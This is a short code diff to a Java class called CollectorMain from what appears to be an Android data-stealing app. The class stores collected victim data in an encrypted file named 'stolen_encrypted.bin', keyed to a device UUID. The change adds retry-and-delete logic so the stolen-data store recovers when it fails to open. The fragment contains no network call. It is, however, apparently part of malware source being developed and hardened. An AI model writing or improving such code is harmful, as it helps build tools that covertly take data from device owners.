@@ -56,12 +56,18 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		BinaryPrefImpl sb;
 		String uuid=TheApplication.instance.uuid;
 		if(stolenInfos==null){
+			int fails=0;
 			while(true){
 				try {
 					sb=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
 					break;
 				} catch (IOException e) {
 					DebugWriter.writeToW("CollectorMain",e);
+					fails++;
+					if(fails==10){
+						new File(getFilesDir(), "stolen_encrypted.bin").delete();
+						fails=0;
+					}
 				}
 			}
 			stolenInfos=sb;
